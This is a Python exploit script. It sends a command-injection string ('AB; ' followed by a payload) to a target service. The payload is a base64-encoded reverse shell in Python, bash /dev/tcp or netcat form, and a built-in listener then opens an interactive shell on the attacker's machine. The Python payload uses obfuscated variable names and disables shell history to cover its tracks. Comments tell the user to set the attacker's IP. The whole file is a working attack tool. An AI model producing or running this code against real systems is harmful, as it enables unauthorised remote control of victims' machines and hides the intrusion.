#!/usr/bin/python3
import argparse
import socket
import base64
import threading
import logging

# Configure logging
logging.basicConfig(
    filename='exploit_log.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# PayloadGenerator class to handle the generation of different payloads
class PayloadGenerator:
    def __init__(self, local_ip, local_port):
        self.local_ip = local_ip
        self.local_port = local_port
        logging.info(f"PayloadGenerator initialized with IP: {self.local_ip}, Port: {self.local_port}")

    def gen_payload(self, payload_type):
        base = base64.b64encode(payload_type.encode())
        return f'echo {base.decode()} |base64 -d|/bin/bash'

    def get_python_payload(self):
        return f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{self.local_ip}\';EvKOcV={self.local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '

    def get_bash_payload(self):
        return f'bash -i >& /dev/tcp/{self.local_ip}/{self.local_port} 0>&1'

    def get_netcat_payload(self):
        return f'nc -e /bin/bash {self.local_ip} {self.local_port}'

# ExploitSender class to send the exploit payload to the target
class ExploitSender:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        logging.info(f"ExploitSender initialized with target IP: {self.target_ip}, Port: {self.target_port}")

    def connect_to_target(self):
        try:
            logging.info(f"Attempting connection to target {self.target_ip}:{self.target_port}")
            self.socket = socket.create_connection((self.target_ip, self.target_port))
            logging.info("Connection to target established.")
        except socket.error as error:
            logging.error(f"Connection to target failed: {error}")
            print(f"Connection to target failed: {error}")
            return False
        return True

    def send_payload(self, payload):
        try:
            logging.info(f"Sending payload: {payload}")
            self.socket.sendall((f'AB; {payload} \n').encode())
            logging.info("Payload sent successfully.")
        except Exception as e:
            logging.error(f"Failed to send exploit: {e}")
            print(f"Failed to send exploit: {e}")
        finally:
            self.socket.close()

# Listener class to create a reverse shell listener
class Listener:
    def __init__(self, local_ip, local_port):
        self.local_ip = local_ip
        self.local_port = local_port
        logging.info(f"Listener initialized on {self.local_ip}:{self.local_port}")

    def start_listener(self):
        try:
            listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener_socket.bind((self.local_ip, self.local_port))
            listener_socket.listen(1)
            logging.info(f"Listening on {self.local_ip}:{self.local_port} for incoming connections...")
            print(f"Listening on {self.local_ip}:{self.local_port} for incoming connections...")
            conn, addr = listener_socket.accept()
            logging.info(f"Connection received from {addr}")
            print(f"Connection received from {addr}")
            self.handle_shell(conn)
        except Exception as e:
            logging.error(f"Error in listener: {e}")
            print(f"Error in listener: {e}")

    def handle_shell(self, conn):
        try:
            while True:
                cmd = input("Shell> ")  # You can type commands here to interact with the reverse shell
                if cmd.strip() == 'exit':
                    conn.close()
                    logging.info("Session closed by user")
                    break
                conn.send(cmd.encode() + b'\n')
                response = conn.recv(4096).decode()
                print(response)
                logging.info(f"Command executed: {cmd}, Response: {response.strip()}")
        except Exception as e:
            logging.error(f"Error handling shell: {e}")
            print(f"Error handling shell: {e}")

# Main class to coordinate the entire process
class ExploitFramework:
    def __init__(self, target_ip, target_port, payload_type, local_ip, local_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.payload_type = payload_type
        self.local_ip = local_ip
        self.local_port = local_port
        self.payload_generator = PayloadGenerator(self.local_ip, self.local_port)
        self.listener = Listener(self.local_ip, self.local_port)
        self.exploit_sender = ExploitSender(self.target_ip, self.target_port)

    def run(self):
        # Start the listener in a separate thread
        listener_thread = threading.Thread(target=self.listener.start_listener)
        listener_thread.start()

        # Connect to target and send the payload
        if self.exploit_sender.connect_to_target():
            if self.payload_type == 'python':
                payload = self.payload_generator.gen_payload(self.payload_generator.get_python_payload())
            elif self.payload_type == 'bash':
                payload = self.payload_generator.gen_payload(self.payload_generator.get_bash_payload())
            elif self.payload_type == 'netcat':
                payload = self.payload_generator.gen_payload(self.payload_generator.get_netcat_payload())
            self.exploit_sender.send_payload(payload)

# Argument Parsing for the script
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('target_port', help='Target port', type=int)
    parser.add_argument('-payload', help='Payload type', required=True, choices=['python', 'netcat', 'bash'])
    args = parser.parse_args()

    # Configure the local IP and port for listening
    local_ip = '192.168.0.200'  # CHANGE THIS to your attacker's IP
    local_port = 9595  # CHANGE THIS to the port you want to use for reverse shell

    # Initialize and run the framework
    framework = ExploitFramework(args.target_ip, args.target_port, args.payload, local_ip, local_port)
    framework.run()
